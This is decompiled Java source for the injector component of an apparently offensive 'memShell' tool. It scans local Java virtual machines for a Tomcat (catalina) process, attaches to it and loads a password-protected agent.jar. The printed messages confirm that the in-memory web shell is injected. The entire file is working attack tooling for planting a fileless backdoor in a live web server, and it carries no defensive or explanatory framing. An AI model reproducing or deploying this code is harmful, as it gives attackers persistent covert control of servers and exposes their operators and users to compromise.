//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package net.rebeyond.memshell;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import java.io.File;
import java.util.Iterator;
import java.util.List;

public class Attach {
	public Attach() {
	}

	public static void main(String[] args) throws Exception {
		if (args.length != 1) {
			System.out.println("Usage:java -jar inject.jar password");
		} else {
			VirtualMachine vm = null;
			List<VirtualMachineDescriptor> vmList = null;
			String password = args[0];
			String currentPath = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath();
			currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
			String agentFile = currentPath + "agent.jar";
			agentFile = (new File(agentFile)).getCanonicalPath();
			String agentArgs = currentPath;
			if (!password.equals("") || password != null) {
				agentArgs = currentPath + "^" + password;
			}

			while(true) {
				while(true) {
					try {
						vmList = VirtualMachine.list();
						if (vmList.size() > 0) {
							Iterator var7 = vmList.iterator();

							while(var7.hasNext()) {
								VirtualMachineDescriptor vmd = (VirtualMachineDescriptor)var7.next();
								if (vmd.displayName().indexOf("catalina") >= 0 || vmd.displayName().equals("")) {
									vm = VirtualMachine.attach(vmd);
									if (!vmd.displayName().equals("") || vm.getSystemProperties().containsKey("catalina.home")) {
										System.out.println("[+]OK.i find a jvm.");
										Thread.sleep(1000L);
										if (null != vm) {
											vm.loadAgent(agentFile, agentArgs);
											System.out.println("[+]memeShell is injected.");
											vm.detach();
											return;
										}
									}
								}
							}

							Thread.sleep(3000L);
						}
					} catch (Exception var9) {
						var9.printStackTrace();
					}
				}
			}
		}
	}
}
